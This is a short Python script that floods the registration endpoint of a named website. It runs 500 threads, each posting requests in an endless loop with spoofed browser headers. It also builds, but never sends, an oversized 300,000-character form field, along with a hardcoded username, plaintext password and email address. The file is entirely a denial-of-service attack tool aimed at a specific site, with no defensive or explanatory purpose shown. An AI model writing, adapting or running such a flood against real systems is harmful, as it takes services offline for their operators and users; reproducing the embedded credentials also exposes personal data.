import threading
import requests


def main():
    url = r"https://www.snowm123.com/e/member/doaction.php"
    headers = {
        "Host": "www.snowm123.com",
        "Origin": "https://www.snowm123.com",
        "Referer": "https://www.snowm123.com/auth/register/",
        "User-Agent": "Mozilla/5.0 (Windows NT 7.0; rv:72.0) Gecko/20100101 Firefox/91.0",
        "Connection": "keep-alive"
    }
    data = {
        "enews":"registerajax",
        "verify":"8160b3b8ee0c93c0997307bf92a975d2",
        "username":"Jananaa",
        "password":"Ln041123_",
        "repassword":"Ln041123_",
        "email":"Jananaa0411@qq.com"
    }
    v_code = ""
    for i in range(300000):
        v_code = v_code + "k"
    data["v_code"] = v_code

    while True:
        requests.post(url,headers=headers)
        print("ok")

thread_list = []
for i in range(500):
    t = threading.Thread(target=main)
    thread_list.append(t)

for i in thread_list:
    i.start()